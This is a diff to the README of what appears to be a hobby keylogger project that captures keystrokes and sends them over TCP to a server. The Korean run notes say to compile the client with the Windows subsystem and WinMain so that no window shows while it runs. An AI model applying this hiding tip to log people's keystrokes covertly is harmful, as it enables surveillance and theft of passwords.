@@ -8,9 +8,9 @@ Capture keyboard input, and then send it to a server.
 
 # 실행 방법
 - server 프로그램을 먼저 실행하고 client 서버를 그 다음에 실행할 것.
-- 프로젝트 속성에서 링커-시스템-하위 시스템을 창(/SUBSYSTEM:WINDOWS)으로 바꾸어야 실행 화면에 뜨지 않음. (! main()도 콘솔형과 다르게 int WINAPI WinMain 사용.)
+- client 프로그램은 프로젝트 속성에서 링커-시스템-하위 시스템을 창(/SUBSYSTEM:WINDOWS)으로 바꾸어야 실행 화면에 뜨지 않음. (! main()도 콘솔형과 다르게 int WINAPI WinMain 사용.)
   ![스크린샷 2023-11-09 234053](https://github.com/goodrain95/Keylogger_with_TCP/assets/143669574/82dc6301-7e2c-4de4-9692-2fcce1d22016)
-
+- server 프로그램은 추가 설정 없이 컴파일하면 됨.
 
 ## IDE
 - OS: Windows 11
